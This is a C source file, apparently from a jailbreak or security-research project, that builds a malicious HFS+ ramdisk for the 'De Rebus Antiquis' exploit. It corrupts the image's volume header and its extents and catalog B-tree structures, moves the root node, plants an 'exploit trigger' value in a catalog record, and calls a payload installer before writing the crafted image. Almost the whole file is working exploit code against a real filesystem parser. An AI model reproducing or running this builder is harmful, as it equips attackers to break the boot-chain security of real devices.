#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/endian.h>
#include <hfs.h>
#include <target.h>

static inline uint16_t be16(uint16_t x) { return __builtin_bswap16(x); }
static inline uint32_t be32(uint32_t x) { return __builtin_bswap32(x); }
static inline uint64_t be64(uint64_t x) { return __builtin_bswap64(x); }

static int read_file_into_buffer(char* path, uint8_t** buf, size_t* len) {
    FILE* f = fopen(path, "rb");
    if(!f) {
        return -1;
    }
    fseek(f, 0, SEEK_END);
    *len = ftell(f);
    fseek(f, 0, SEEK_SET);
    if(!*len) {
        return -1;
    }

    *buf = malloc(*len);
    if(!*buf) {
        return -1;
    }
    fread(*buf, 1, *len, f);
    fclose(f);
    return 0;
}

static int write_file_from_buffer(char* path, uint8_t** buf, size_t len) {
    FILE* f = fopen(path, "wb+");
    if(!f) {
        return -1;
    }
    fwrite(*buf,len,1,f);
    free(*buf);
    fclose(f);
    return 0;
}

void* get_catalog_file(uint8_t* buf, HFSPlusVolumeHeader* header) {
    return (void*)(buf + (be32(header->catalogFile.extents[0].startBlock) * be32(header->blockSize)));
}

void* get_extents_file(uint8_t* buf, HFSPlusVolumeHeader* header) {
    return (void*)(buf + (be32(header->extentsFile.extents[0].startBlock) * be32(header->blockSize)));
}

void patch_header(HFSPlusVolumeHeader* header) {
    printf("Signature: %s\n", (char*)&header->signature);
    printf("Blocksize: 0x%x\n", be32(header->blockSize));

    header->catalogFile.logicalSize = be64(512ULL * 0x7FFFFFULL);
    header->extentsFile.logicalSize = be64(EXTENT_SIZE);

    printf("HFSPlusVolumeHeader->catalogFile.logicalSize 0x%llx\n", be64(header->catalogFile.logicalSize));
    printf("HFSPlusVolumeHeader->extentsFile.logicalSize 0x%llx\n", be64(header->extentsFile.logicalSize));
}

void patch_extents_file(uint8_t* buf, HFSPlusVolumeHeader* header) {
    BTNodeDescriptor* node_desc = get_extents_file(buf, header);
    printf("Extents file at 0x%lx\n", (uint8_t*)node_desc - buf);
    BTHeaderRec* btree_head = (BTHeaderRec*)&node_desc[1];
    memset(node_desc, 'F', 256);
    btree_head->nodeSize = be16(NODE_SIZE);
    btree_head->totalNodes = be32(TOTAL_NODES);
    btree_head->rootNode = be32(EXTENTS_ROOT_NODE); /* Must be big, but LSB must be zero */
    btree_head->treeDepth = 0;
    btree_head->leafRecords &= be32(0xFFFF); // LSBs must == 0

}

void patch_catalog_file(uint8_t* buf, HFSPlusVolumeHeader* header) {
    BTNodeDescriptor* node_desc = get_catalog_file(buf, header);
    printf("Catalog file at 0x%lx\n", (uint8_t*)node_desc - buf);

    BTHeaderRec* btree_head = (BTHeaderRec*)&node_desc[1];
    uint32_t old_root_node = be32(btree_head->rootNode);
    memset(node_desc, 'E', sizeof(BTNodeDescriptor));
    memset(&btree_head->leafRecords, 'E', 256 - (sizeof(BTNodeDescriptor) + sizeof(uint32_t) + sizeof(uint16_t)));

#if COPY_ROOT
            btree_head->treeDepth = be16(3);
#endif
            btree_head->nodeSize = be16(512);
            btree_head->totalNodes = be32(0x7FFFFF);
#if FLAT_TREE
            btree_head->rootNode = be32(0x7FFFFF / 512 - 1);
#elif COPY_ROOT
            /* We need to move the root node... */
            BTNodeDescriptor* root_node = (BTNodeDescriptor*)((uint8_t*)node_desc + be16(btree_head->nodeSize) * old_root_node);
            int new_root = -1;

            /* First find a suitable node with no records. */
            for(int node_index = old_root_node+1; node_index < be32(btree_head->totalNodes); node_index += 1) {
                BTNodeDescriptor* proposed_node_desc = (BTNodeDescriptor*)(((uint8_t*)node_desc) + be16(btree_head->nodeSize) * node_index);
                if(proposed_node_desc->numRecords == 0) {
                    new_root = node_index;
                    break;
                }
            }
            printf("Moving root node from %d to %d... ", old_root_node, new_root);

            /* Copy the root node to the new location */
            BTNodeDescriptor* new_root_node_desc = (BTNodeDescriptor*)((uint8_t*)node_desc + be16(btree_head->nodeSize) * new_root);
            memcpy(new_root_node_desc, root_node, 512);

            /* The tree is now 1 taller... */
            new_root_node_desc->height += 1;

            printf("Done.\n");

            uint16_t* offsets = (uint16_t*)((uint8_t*)new_root_node_desc + be16(btree_head->nodeSize) - (sizeof(uint16_t) * (be16(new_root_node_desc->numRecords))));

            for(int i = 0; i < be16(new_root_node_desc->numRecords); i += 1) {
                HFSPlusCatalogKey* key = (HFSPlusCatalogKey*)((uint8_t*)new_root_node_desc + be16(offsets[i]));

                uint8_t* offset = (uint8_t*)key + be16(key->keyLength) + sizeof(uint16_t);

                /* Trigger our exploit on record '0'. */
                if(i == 0) {
                    printf("Installing exploit trigger at 0x%lx... ", offset - buf);
                    *(uint32_t*)offset = be32(0x10003);
                    printf("Done.\n");
                    continue;
                }

                /* By default point the record back to the root node */
                *(uint32_t*)offset = be32(old_root_node);
            }

            btree_head->rootNode = be32(new_root);
#else
#error "Must choose FLAT_TREE or COPY_ROOT."
#endif
}

int main(int argc, char *argv[]) {
    uint8_t* buffer;
    size_t file_len;
    HFSPlusVolumeHeader* header;
    if (argc < 3) {
        printf("Usage: %s <dmg_in> <dmg_out>\n", argv[0]);
        return 1;
    }

    printf("De Rebus Antiquis Exploit by xerub.\n");
    printf("Exploit ramdisk builder brought to you by synackuk.\n");

    printf("Loading ramdisk... ");
    read_file_into_buffer(argv[1], &buffer, &file_len);
    printf("Done.\n");

    /* HFS+ Header is at 0x400. */
    header = (HFSPlusVolumeHeader*)(buffer + 0x400);
    patch_header(header);
    patch_extents_file(buffer, header);
    patch_catalog_file(buffer, header);
    install_payload(buffer, (uint8_t*)header, get_catalog_file(buffer, header), get_extents_file(buffer, header));

    printf("Writing ramdisk... ");
    write_file_from_buffer(argv[2], &buffer, file_len);
    printf("Done.\n");

    return 0;
}